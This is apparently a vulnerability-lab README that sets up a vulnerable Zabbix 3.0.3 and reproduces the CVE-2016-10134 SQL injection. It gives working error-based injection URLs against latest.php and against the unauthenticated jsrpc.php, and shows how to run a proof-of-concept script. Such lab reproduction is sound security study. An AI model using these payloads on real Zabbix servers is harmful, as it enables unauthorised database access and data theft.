# Zabbix latest.php SQL Injection (CVE-2016-10134)

[中文版本(Chinese version)](README.zh-cn.md)

Zabbix is a server monitoring software that consists of server, agent, and web modules. The web module is written in PHP and is used to display results from the database.

In the Zabbix version before 2.2.14 and 3.0 before 3.0.4, there is a SQL injection vulnerability in the `latest.php` file. This vulnerability allows remote attackers to execute arbitrary SQL commands via the `toggle_ids` array parameter. This vulnerability can also be triggered through jsrpc.php without authentication.

References:

- https://support.zabbix.com/browse/ZBX-11023
- https://www.exploit-db.com/exploits/40237
- https://www.exploit-db.com/exploits/40353

## Environment Setup

Execute the following command to start Zabbix 3.0.3:

```
docker compose up -d
```

After executing the command, it will start the database (MySQL), Zabbix server, Zabbix agent, and Zabbix web interface. If your system has limited memory, some containers might fail to start. You can check container status using `docker compose ps` and restart containers using `docker compose start`.

## Vulnerability Reproduction

Visit `http://your-ip:8080` and log in with the guest account (username: `guest`, password: empty).

After logging in, check the `zbx_sessionid` in your cookies and copy the last 16 characters:

![](1.png)

Use these 16 characters as the sid value and visit `http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)`. You can see the successful SQL injection:

![](2.png)

This vulnerability can also be triggered through jsrpc.php without requiring login: `http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)`:

![](3.png)

During debugging, I discovered that the `latest.php` SQL injection is possible without requiring a username and password. For implementation details, see the POC.

```shell
python3 CVE-2016-10134.py -t 127.0.0.1:8080

python3 CVE-2016-10134.py --target 127.0.0.1:8080
```
